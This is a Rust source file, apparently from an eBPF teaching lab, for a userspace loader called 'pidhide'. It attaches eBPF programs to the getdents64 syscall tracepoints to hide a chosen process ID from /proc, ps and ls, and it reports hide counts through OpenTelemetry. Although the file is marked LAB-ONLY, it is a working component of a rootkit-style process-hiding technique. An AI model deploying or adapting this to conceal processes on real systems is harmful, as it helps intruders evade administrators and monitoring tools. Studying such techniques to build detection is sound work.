//! pidhide — LAB-ONLY. Hides a PID (argv[1] or $HIDE_PID) from /proc by
//! rewriting getdents64 results. Exports ebpf_proc_hidden_total.
use std::time::Duration;

use aya::{
    maps::{Array, HashMap},
    programs::TracePoint,
    Ebpf,
};
use log::{info, warn};
use opentelemetry::{global, KeyValue};
use opentelemetry_otlp::WithExportConfig;
use pidhide_common::PidName;

fn init_otel() -> anyhow::Result<opentelemetry_sdk::metrics::SdkMeterProvider> {
    let endpoint = std::env::var("OTEL_EXPORTER_OTLP_ENDPOINT")
        .unwrap_or_else(|_| "http://127.0.0.1:4318".to_string());
    let exporter = opentelemetry_otlp::MetricExporter::builder()
        .with_http().with_endpoint(format!("{endpoint}/v1/metrics")).build()?;
    let reader = opentelemetry_sdk::metrics::PeriodicReader::builder(
        exporter, opentelemetry_sdk::runtime::Tokio,
    ).with_interval(Duration::from_secs(2)).build();
    let provider = opentelemetry_sdk::metrics::SdkMeterProvider::builder()
        .with_reader(reader)
        .with_resource(opentelemetry_sdk::Resource::new(vec![
            KeyValue::new("service.name", "ebpf-pidhide"),
            KeyValue::new("service.namespace", "ebpf-with-aya"),
        ])).build();
    global::set_meter_provider(provider.clone());
    Ok(provider)
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();
    let pid = std::env::args().nth(1)
        .or_else(|| std::env::var("HIDE_PID").ok())
        .ok_or_else(|| anyhow::anyhow!("usage: pidhide <pid>  (or $HIDE_PID)"))?;
    warn!("LAB-ONLY: hiding pid {pid} from /proc — this taints the kernel");

    let mut ebpf = Ebpf::load(aya::include_bytes_aligned!(concat!(env!("OUT_DIR"), "/pidhide")))?;

    {
        let mut name = [0u8; 16];
        let b = pid.as_bytes();
        let n = b.len().min(15);
        name[..n].copy_from_slice(&b[..n]);
        let mut target: Array<_, PidName> = Array::try_from(ebpf.map_mut("TARGET").unwrap())?;
        target.set(0, PidName(name), 0)?;
    }

    for name in ["enter_getdents", "exit_getdents"] {
        let prog: &mut TracePoint = ebpf.program_mut(name).unwrap().try_into()?;
        prog.load()?;
        let tp = if name == "enter_getdents" { "sys_enter_getdents64" } else { "sys_exit_getdents64" };
        prog.attach("syscalls", tp)?;
    }
    info!("attached — pid {pid} is now hidden from ps / ls /proc while this runs");

    let provider = init_otel()?;
    let meter = global::meter("ebpf-pidhide");
    let hidden = meter.u64_counter("ebpf_proc_hidden_total").build();
    let hides: HashMap<_, u32, u64> = HashMap::try_from(ebpf.take_map("HIDES").unwrap())?;
    let mut last = 0u64;

    loop {
        tokio::select! {
            _ = tokio::signal::ctrl_c() => { info!("detaching — pid reappears"); break; }
            _ = tokio::time::sleep(Duration::from_secs(2)) => {
                let total = hides.get(&0, 0).unwrap_or(0);
                if total > last { hidden.add(total - last, &[]); info!("hides so far: {total}"); last = total; }
            }
        }
    }
    provider.shutdown()?;
    Ok(())
}
